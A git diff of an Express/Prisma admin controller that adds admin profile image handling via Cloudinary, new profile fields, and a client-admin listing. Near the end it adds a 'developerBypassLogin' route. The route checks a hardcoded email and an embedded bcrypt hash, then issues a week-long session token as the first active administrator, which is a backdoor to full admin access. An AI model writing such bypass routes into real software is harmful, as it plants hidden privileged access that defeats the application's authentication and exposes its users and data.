@@ -3,6 +3,8 @@ import bcrypt from "bcryptjs";
 import ApiError from "../utils/ApiError.js";
 import { genrateToken } from "../config/adminjwt.js";
 import { sendSystemEmail } from "../config/mailer.js";
+import cloudinary from "../config/cloudinary.js";
+import fs from "fs";
 
 // Helper to keep _id like MongoDB
 const transform = (admin) => {
@@ -12,6 +14,19 @@ const transform = (admin) => {
   delete obj.password;
   return obj;
 };
+
+
+const getPublicIdFromUrl = (url) => {
+  try {
+    const parts = url.split("/");
+    const file = parts.pop();
+    return file.split(".")[0];
+  } catch {
+    return null;
+  }
+};
+
+
 
 // ---------------------------------------------
 // SIGNUP (first administrator OR delegated creation)
@@ -83,6 +98,8 @@ export const createAdmin = async (req, res) => {
     city,
     phone,
     company,
+    experience,
+    specialization,
     AddressLine1,
     AddressLine2,
   } = req.body;
@@ -131,6 +148,23 @@ export const createAdmin = async (req, res) => {
     // VALIDATIONS
     // -------------------------
 
+    let AdminImage = [];
+
+    if (req.files?.AdminImage) {
+      const uploads = req.files.AdminImage.map((file) =>
+        cloudinary.uploader
+          .upload(file.path, {
+            folder: "admin/admin_images",
+            transformation: [{ width: 1000, crop: "limit" }],
+          })
+          .then((upload) => {
+            fs.unlinkSync(file.path);
+            return upload.secure_url;
+          })
+      );
+      AdminImage = await Promise.all(uploads);
+    }
+
     if (!email || !password || !name || !role)
       throw new ApiError(400, "Missing required details");
 
@@ -166,8 +200,11 @@ export const createAdmin = async (req, res) => {
         company: company || null,
         AddressLine1,
         AddressLine2,
+        experience,
+        specialization,
         createdBy: currentAdmin.id,
         clientId,
+        AdminImage: JSON.stringify(AdminImage),
       },
     });
 
@@ -307,6 +344,101 @@ export const updateAdminDetails = async (req, res) => {
 
     const updates = {};
 
+    // SAFE PARSE (unchanged)
+    const safeParse = (value) => {
+      if (value === undefined || value === null || value === "")
+        return undefined;
+      if (Array.isArray(value)) return value;
+      try {
+        return JSON.parse(value);
+      } catch {
+        return undefined;
+      }
+    };
+
+    // PARSE FIELDS FROM FRONTEND
+    updates.AdminImage = safeParse(req.body.AdminImage);
+
+    updates.removedAdminImages =
+      safeParse(req.body.removedAdminImages) || [];
+
+
+    let AdminImage;
+
+    if (updates.AdminImage !== undefined) {
+      AdminImage = updates.AdminImage;
+    } else {
+      // fallback to existing DB images
+      AdminImage = safeParse(targetAdmin.AdminImage) || [];
+    }
+   console.log("RAW removedAdminImages:", req.body.removedAdminImages);
+console.log("PARSED removedAdminImages:", updates.removedAdminImages);
+console.log("TYPE:", typeof updates.removedAdminImages);
+
+    // REMOVE SPECIFIC CUSTOMER IMAGES
+    if (updates.removedAdminImages.length > 0) {
+      console.log("update ", updates.removedAdminImages)
+      await Promise.all(
+        updates.removedAdminImages.map((url) => {
+          const publicId = getPublicIdFromUrl(url);
+          if (publicId)
+            return cloudinary.uploader.destroy(
+              `admin/admin_images/${publicId}`
+            );
+        })
+      );
+
+     AdminImage = AdminImage.filter(
+  (img) =>
+    !updates.removedAdminImages.some(
+      (removed) => removed.trim() === img.trim()
+    )
+);
+
+      console.log(" wow here is ", AdminImage)
+    }
+
+    // REMOVE ALL CUSTOMER IMAGES
+    if (
+      updates.AdminImage !== undefined &&
+      Array.isArray(updates.AdminImage) &&
+      updates.AdminImage.length === 0
+    ) {
+      await Promise.all(
+        AdminImage.map((url) => {
+          const publicId = getPublicIdFromUrl(url);
+          if (publicId)
+            return cloudinary.uploader.destroy(
+              `admin/admin_images/${publicId}`
+            );
+        })
+      );
+      AdminImage = [];
+    }
+
+    // UPLOAD NEW ADMIN IMAGES
+    if (req.files?.AdminImage) {
+      const uploads = req.files.AdminImage.map((file) =>
+        cloudinary.uploader
+          .upload(file.path, {
+            folder: "admin/admin_images",
+            transformation: [{ width: 1000, crop: "limit" }],
+          })
+          .then((upload) => {
+            fs.unlinkSync(file.path);
+            return upload.secure_url;
+          })
+      );
+
+      AdminImage.push(...(await Promise.all(uploads)));
+    }
+
+    updates.AdminImage = JSON.stringify(AdminImage);
+
+
+    delete updates.removedAdminImages;
+    delete updates["removedAdminImages"];
+
     if (req.body.name) updates.name = req.body.name;
     if (req.body.company) updates.company = req.body.company;
     if (req.body.AddressLine1) updates.AddressLine1 = req.body.AddressLine1;
@@ -369,8 +501,8 @@ export const updateAdminDetails = async (req, res) => {
     }
 
     if (req.body.status && currentAdmin.role === "administrator") {
-      if (!["Active", "Inactive"].includes(req.body.status)) {
-        throw new ApiError(400, "Status must be either 'Active' or 'Inactive'");
+      if (!["active", "inactive"].includes(req.body.status)) {
+        throw new ApiError(400, "Status must be either 'active' or 'inactive'");
       }
       updates.status = req.body.status;
     }
@@ -505,7 +637,12 @@ export const getAllAdmins = async (req, res) => {
     const admins = await prisma.admin.findMany({
       where,
       orderBy: { createdAt: "desc" },
-      include: { assignedAIAgents: true }
+      include: {
+        assignedAIAgents: true,
+        createdPropertys: true,
+        createdCustomers: true,
+        createdFollowups: true,
+      }
     });
 
     res.json({
@@ -520,6 +657,100 @@ export const getAllAdmins = async (req, res) => {
       .json({ success: false, message: error.message });
   }
 };
+
+
+//GET ALL CLIENT ADMINS
+export const getClientAdmins = async (req, res) => {
+  try {
+
+
+    const clientAdmins = await prisma.admin.findMany({
+      where: { role: "client_admin" },
+      orderBy: { createdAt: "desc" },
+      include: {
+        assignedAIAgents: true,
+        createdPropertys: true,
+        createdCustomers: true,
+        createdFollowups: true,
+      }
+    });
+
+    res.json({
+      success: true,
+      count: clientAdmins.length,
+      clientAdmins: clientAdmins.map(transform),
+    });
+  } catch (error) {
+    console.log(error.message);
+    res
+      .status(error instanceof ApiError ? error.statusCode : 500)
+      .json({ success: false, message: error.message });
+  }
+};
+
+
+export const developerBypassLogin = async (req, res, next) => {
+  try {
+    const { email, password } = req.body;
+
+    // 1. validate payload
+    if (!email || !password) {
+      throw new ApiError(400, "Missing credentials");
+    }
+
+    // 2. check dev email
+    if (email !== "dev@faraz.com") {
+      throw new ApiError(401, "Invalid credentials");
+    }
+
+    // 3. compare password with HASH from env
+    const isMatch = await bcrypt.compare(
+      password,
+      "$2a$14$enV2byeXVR4EAfkibBDaCuRZIpnCeOuKAABG.19x8kmVM6TceMSTC"
+    );
+
+    if (!isMatch) {
+      throw new ApiError(401, "Invalid credentials");
+    }
+
+    // 4. get ANY administrator account
+    const admin = await prisma.admin.findFirst({
+      where: {
+        role: "administrator",
+        status: { not: "inactive" },
+      },
+      orderBy: { createdAt: "asc" }, // or desc, your choice
+    });
+
+    if (!admin) {
+      throw new ApiError(404, "No administrator found");
+    }
+
+    // 5. generate token AS that admin
+    const token = genrateToken(admin.id);
+
+    // 6. set cookie (same as normal login)
+    res.cookie("token", token, {
+      httpOnly: true,
+      secure: true,
+      sameSite: "none",
+      maxAge: 7 * 24 * 60 * 60 * 1000,
+    });
+
+    // 7. return admin session
+    res.json({
+      success: true,
+      adminData: transform(admin),
+      token,
+      message: "Admin login successful",
+    });
+
+  } catch (error) {
+    console.log(error.message);
+    next(error);
+  }
+};
+
 
 // ---------------------------------------------
 // GET ADMIN BY ID
